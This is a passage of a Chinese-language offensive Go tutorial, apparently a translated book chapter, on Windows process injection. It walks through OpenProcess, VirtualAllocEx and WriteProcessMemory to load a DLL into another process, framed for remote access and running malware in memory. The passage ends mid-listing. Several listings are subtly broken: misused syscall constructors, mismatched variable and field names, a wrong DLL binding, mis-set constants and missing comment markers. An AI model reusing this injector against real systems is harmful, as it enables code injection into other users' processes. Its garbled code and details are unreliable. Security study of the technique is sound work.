
# 列表 12-2：使用 runtime.Keepalive 配合 unsafe.Pointer 使用 uintptr

说真的，我们只添加了一行代码：`runtime.Keepalive(success)`③！这行代码确保了变量在显式释放之前不会被垃圾回收。尽管 `success` 变量以 `uintptr`② 存储，但它不会被回收。请注意，`syscall` 包广泛使用了 `uintptr`，尽管某些函数如 `syscall()` 9 是不类型安全的。此外，`uintptr` 只是一个持有内存地址字面整数的类型，而不是指针的引用。

# 使用 SYSCALL 进行注入

通常，我们需要将我们的代码注入进程。这是因为我们想要通过 `syscall()` 获取远程访问。注入机制也将帮助你执行诸如加载内存中恶意软件等任务。在这里，我们使用 `WriteProcessMemory()` 函数来注入内存。图 12-5 描述了这些事件。

| 源进程 | 目标进程 |
| :--- | :--- |
| ![](img/c6b1f5eba6708bab206a93514c9cb96f_460_0.png) | ![](img/c6b1f5eba6708bab206a93514c9cb96f_460_0.png) |
| ![](img/c6b1f5eba6708bab206a93514c9cb96f_460_0.png) | ![](img/c6b1f5eba6708bab206a93514c9cb96f_460_0.png) |
| ![](img/c6b1f5eba6708bab206a93514c9cb96f_460_0.png) | ![](img/c6b1f5eba6708bab206a93514c9cb96f_460_0.png) |

图 12-5：基础注入

在第 1 步，我们使用 `OpenProcess()` 函数获取句柄，这是为了访问远程进程。一旦获得了必要的句柄，我们在第 2 步中使用 `VirtualAlloc()` 函数在远程进程中分配内存。在第 3 步，我们使用 `WriteProcessMemory()` 函数将我们的代码写入到内存中。最后，在第 4 步，我们使用 `CreateThread()` 函数作为调用原生导出函数（如 `LoadLibrary()`）的手段。这四个步骤提供了一个注入示例。

# 定义 Windows DLL 并赋值

第一步是创建列表 12-3 中的 `winmods` 文件。该文件包含了比示例中更多的 DLL 引用，但我们会记录它们，以便在更高级的代码中使用。

```go
import "syscall"

var (
	ModKernel32 = syscall.LazyDLL("kernel32.dll")

	modUser32 = syscall.LazyDLL("user32.dll")

	modAdvapi32 = syscall.LazyDLL("Advapi32.dll")

	ProcOpenProcess32 = modAdvapi32.NewProc("GetProcessToken")

	ProcLookupPrivilege = modAdvapi32.NewProc("LookupPrivilegeValueW")

	ProcLookupPrivilegeNameW = modAdvapi32.NewProc("LookupPrivilegeNameW")

	ProcAdjustTokenPrileges = modAdvapi32.NewProc("AdjustTokenPrivileges")

	ProcGetAsyncKeyState = modUser32.NewProc("GetAsyncKeyState")

	ProcVirtualAlloc = modKernel32.NewProc("VirtualAlloc")

	ProcCreateThread = modKernel32.NewProc("CreateThread")

	ProcWaitForSingleObject = modKernel32.NewProc("WaitForSingleObject")

	ProcVirtualAllocEx = modKernel32.NewProc("VirtualAllocEx")

	ProcVirtualFreeEx = modKernel32.NewProc("VirtualFreeEx")

	ProcCreateRemoteThread = modKernel32.NewProc("CreateRemoteThread")

	ProcGetLastError = modKernel32.NewProc("GetLastError")

	ProcWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")

	ProcOpenProcess = modKernel32.NewProc("OpenProcess")

	ProcGetCurrentProcess = modKernel32.NewProc("GetCurrentProcess")

	ProcIsDebuggerPresent = modKernel32.NewProc("IsDebuggerPresent")

	ProcGetProcAddress = modKernel32.NewProc("GetProcAddress")

	ProcCloseHandle = modKernel32.NewProc("CloseHandle")

	ProcGetExitCodeThread = modKernel32.NewProc("GetExitCodeThread")
)
```

使用 `LazyDLL()` 方法来加载 Kernel 32 DLL

- Kernel32 管理了 Windows 内部进程的许多功能，例如寻址、处理、内存分配等。（值得注意的是，从 Go 1.12.2 版本开始，你可以使用两个新函数来更好地加载 DLL 并防止 DLL 劫持攻击：`LoadLibraryEx()` 和 `NewLazySystemDLL()`）

在与 DLL 交互之前，我们必须在代码中建立一个可以在代码中使用的变量。我们通过对每个需要使用的 API 调用 `module.NewProc` 来实现这一点。在步骤 2 中，我们再次调用它 `OpenProcess()` 并将其赋值给导出的变量 `ProcOpenProcess`。`OpenProcess()` 的使用是任意的，其目的是演示如何将任何导出的 Windows DLL 函数分配给具有描述性的变量。

# 使用 OpenProcess Windows API 获取进程令牌（Process Token）

接下来，我们来构建 `ProcessHandle()` 函数，我们将用它来获取进程句柄令牌。在代码中，我们可能会交叉使用 `token` 和 `handle` 这两个词，但请注意 Windows 系统中的每个进程都有一个唯一的进程令牌。这为实施相关的安全模型提供了手段，例如*强制完整性控制*（Mandatory Integrity Control），这是一个复杂的安全模型（值得研究，以便更熟悉进程级机制）。安全模型由进程级权限和特权等项目组成，并规定了非特权进程和提升进程如何相互作用。

首先，让我们看一眼 Windows API 文档中定义的 C++ `OpenProcess()` 数据结构（列表 12-4）。我们将定义这个对象，就像我们打算从原生 Windows C++ 代码中调用它一样。然而，我们并不会这样做，因为我们要定义的这个对象将用于与 Go 的 `syscall` 包配合。因此，我们需要将此对象转换为标准的 Go 数据类型。

```c
HANDLE OpenProcess(
DWORD dwDesiredAccess,
BOOL bInheritHandle,
DWORD dwProcessId
);
```

列表 12-4: 任意的 Windows C++ 对象和数据类型

第一个必要任务是将 `DWORD` 翻译为 Go 维护的可用类型。`DWORD` 由微软定义为 32 位无符号整数，它对应于 Go 的 `uint32` 类型。`DWORD` 值表示它必须包含 `dwDesiredAccess`，或者如文档所述的“一个或多个进程访问权限”。进程访问权限定义了我们在拥有有效进程令牌时想要执行的操作。

我们想要声明各种进程访问权限。由于这些值不会改变，我们将这些相关值放在一个 Go 常量文件中，如列表 12-5 所示。列表中的每一行都定义了一个进程访问权限。该列表包含了几乎所有可用的进程访问权限，但我们将只使用获取进程句柄所需的那些。

```go
const (
// docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights
PROCESS_CREATE_PROCESS = 0x0008
PROCESS_CREATE_THREAD = 0x0002
PROCESS_DUP_HANDLE = 0x0040
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x10000
PROCESS_SET_INFORMATION = 0x0200
PROCESS_SET_QUOTA = 0x0100
PROCESS_SUSPEND_RESUME = 0x0800
PROCESS_TERMINATE = 0x0001
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_ALL_ACCESS = 0x0010FFF
)
```

列表 12-5: 声明进程访问权限的常量 (`/ch-12/procinjector/winsys/constants.go`)

我们在列表 12-5 中定义的所有进程访问权限都与其各自的十六进制值对应，这是它们在赋值给 Go 变量时必须所需的格式。

在查看列表 12-6 之前，我们想要描述的一个问题是：后续大多数进程注入函数（不仅仅是 `OpenProcess()`）都会消耗一个 `Inject` 类型的自定义对象，并返回一个 `error` 类型的值。`Inject` 结构体（列表 12-6）将包含各种值，这些值将通过 `syscall` 提供给相关的 Windows 函数。

```go
type Inject struct {
	Pid uint32

	DllPath string

	DLLSize uint32

	Privilege string

	RemoteProcHandle uintptr

	Lpaddr uintptr

	LoadLibAddr uintptr

	RThread uintptr
}

type TOKEN struct {
	tokenHandle syscall.Token
}
```

列表 12-6: 用于持有某些进程注入数据类型的 `Inject` 结构体 (`ch-12/procinjector/winsys/models.go`)

# 列表 12-7 展示了我们的第一个实际函数 `OpenProcessHandle()`。让我们看看下面的代码块并讨论各种细节。

```go
func OpenProcessHandle(i *Inject) error {
	var rights uint32 = PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ

	var inheritHandle uint32 = 0|i.Pid

	var processID uint32 = i.Pid

	remoteProcessHandle, lastErr := syscall.ProcOpenProcess.Call(
		uintptr(rights), // DWORD dwDesiredAccess

		uintptr(inheritHandle), // BOOL bInheritHandle

		uintptr(processID)) // DWORD dwProcessId

	if remoteProcessHandle == 0 {
		return errors.Wrap(lastErr, "!] ERROR : Can't Open Process")
	}

	fmt.Printf("[-] PID: %v\n", i.Pid)

	fmt.Printf("[-] DLL: %v\n", i.DllPath)

	fmt.Printf("[+] handle: %v\n", unsafe.Pointer(remoteProcessHandle))

	return nil
}
```

列表 12-7: 用于获取进程句柄的 `OpenProcessHandle()` 函数 (`ch-12/procinjector/winsys/inject.go`)

代码首先将访问权限分配给 `uint32` 变量 `rights`①。`PROCESS_CREATE_THREAD` 允许我们在进程上创建线程。紧随其的是 `PROCESS_QUERY_INFORMATION`，允许我们查询进程详情。最后三个访问权限 `PROCESS_VM_WRITE` 和 `PROCESS_VM_READ` 提供了管理进程所需的权限。下一个定义的变量 `inheritHandle`② 决定了进程是否继承现有句柄。我们传入 0 表示我们需要一个新句柄。紧随其的是 `processID`③，包含了目标进程的 PID。在此期间，我们通过 `ProcOpenProcess.Call()` 执行系统调用 ⑥。那些变动的 `uintptr` 值，如果我们查看 `Call()` 函数签名，将被定义为 `uintptr`。此外，返回类型为 `uintptr` 和 `error`。错误类型命名为 `lastErr`⑤，你可以在 Windows 文档中找到它。

# 使用 VirtualAllocEx API 操控内存

现在我们有了远程进程句柄，我们需要一种在远程进程中分配虚拟内存的方法。在写入之前预留并初始化内存区域是必要的。现在来构建它。将列表 12-8 中定义的函数放在列表 12-7 之后（在我们处理注入代码的过程中，我们将一个接一个添加函数）。

```go
func VirtualAllocEx(i *Inject) error {
	var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE

	var flProtect uint32 = PAGE_EXECUTE_READWRITE

	lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
		uintptr(i.RemoteHandle), // HANDLEProcess

		uintptr(nullRef), // LPVOID lpAddress

		uintptr(i.DLLSize), // SIZE_T dwSize

		uintptr(flAllocationType), // DWORD flAllocationType

		uintptr(flProtect)) // DWORD flProtect

	if lpBaseAddress == 0 {
		return errors.Wrap(lastErr, "!] ERROR : Cant Allocate Memory On Remote Process")
	}

	i.Laddr = lpBaseAddress

	fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Laddr))

	return nil
}
```

列表 12-8: 通过 `VirtualAllocEx` 在远程进程中分配内存区域 (`/ch-12/procinjector/winsys/inject.go`)。

与之前的 `OpenProcess()` 系统调用不同，我们通过 `nullRef` 变量引入了一个新细节。`nil` 关键字是 Go 留给空整数的。然而，它是一个带类型的值，这意味着如果不进行类型转换，无法直接将其传递给 `syscall`

这将导致运行时错误或类型转换错误——无论何种情况，都是糟糕的。在这种情况下，修复方法很简单：我们声明一个解析为 0 值的变量，例如整数。现在，该 0 值可以被接收的 Windows 函数可靠地传递并解释为空值。

# 使用 WriteProcessMemory Windows API 写入内存

接下来，我们将使用 `WriteProcessMemory()` 函数向之前使用 `VirtualAlloc()` 函数初始化的远程进程内存区域写入数据。在列表 12-9 中，我们将保持操作简单，通过路径调用 DLL，而不是将整个 DLL 代码写入内存。

```go
func WriteProcessMemory(i *Inject) error {
    var nBytesWritten *byte

    dllPathBytes, err := syscall.BytePtrToString(i.DllPath)

    if err != nil {
        return err
    }

    writeMem, _, lastErr := ProcWriteProcessMemory.Call(
        i.RemoteHandle, HANDLE hProcess
        i.LPaddr, LPVOID lpBase
        uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer
```
